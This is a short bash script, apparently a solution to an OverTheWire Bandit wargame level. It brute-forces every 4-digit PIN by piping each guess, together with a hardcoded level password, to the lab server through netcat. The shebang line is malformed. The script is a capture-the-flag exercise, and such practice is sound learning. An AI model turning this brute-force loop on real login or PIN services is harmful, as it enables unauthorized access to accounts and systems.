!bin/bash

old_pass=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

{
			for pin in $(seq -w 0000 9999); do
							echo "$old_pass" "$pin"
			done
} | nc bandit.labs.overthewire.org 30002
